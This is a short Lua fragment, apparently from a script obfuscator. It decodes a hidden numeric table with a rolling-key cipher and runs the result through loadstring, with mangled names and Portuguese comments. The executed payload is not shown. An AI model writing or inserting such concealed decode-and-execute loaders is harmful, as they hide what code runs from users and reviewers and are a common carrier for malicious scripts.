    local function VM_1l111(d, k, m)
        local R_IIOll = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_IIOll, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_IIOll)
    end

    -- Execution Guard
    local F_OO1lll = loadstring(VM_1l111(B_I11IlOO, 10, 5))
    if F_OO1lll then
        F_OO1lll(...)
    end
